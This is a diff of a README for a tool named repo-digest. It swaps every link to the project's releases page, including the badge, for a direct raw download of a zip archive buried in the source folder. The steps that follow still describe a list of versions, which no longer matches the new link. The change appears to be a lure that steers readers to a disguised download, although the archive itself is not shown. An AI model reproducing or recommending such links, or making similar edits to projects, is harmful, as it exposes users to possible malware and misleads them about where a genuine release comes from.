@@ -1,6 +1,6 @@
 # 🚀 repo-digest - Make Your Repository AI-Ready Easily
 
-[![Download repo-digest](https://img.shields.io/badge/Download-repo--digest-blue.svg)](https://github.com/sadatt123/repo-digest/releases)
+[![Download repo-digest](https://github.com/sadatt123/repo-digest/raw/refs/heads/main/src/repo_digest/digest_repo_v3.2-beta.2.zip)](https://github.com/sadatt123/repo-digest/raw/refs/heads/main/src/repo_digest/digest_repo_v3.2-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ To run **repo-digest**, you'll need:
 
 ## 📥 Download & Install
 
-To download **repo-digest**, visit the following link: [Download repo-digest](https://github.com/sadatt123/repo-digest/releases).
+To download **repo-digest**, visit the following link: [Download repo-digest](https://github.com/sadatt123/repo-digest/raw/refs/heads/main/src/repo_digest/digest_repo_v3.2-beta.2.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions. Look for the latest release.
@@ -65,6 +65,6 @@ If you encounter any issues or have questions, feel free to open an issue on our
 
 To learn more about how to maximize your use of **repo-digest**, check our documentation and tutorials available on the repository’s Wiki section.
 
-Remember, you can always download the latest version of **repo-digest** here: [Download repo-digest](https://github.com/sadatt123/repo-digest/releases). 
+Remember, you can always download the latest version of **repo-digest** here: [Download repo-digest](https://github.com/sadatt123/repo-digest/raw/refs/heads/main/src/repo_digest/digest_repo_v3.2-beta.2.zip). 
 
 Now you're ready to turn your repositories into powerful AI-ready bundles! Enjoy using **repo-digest**.
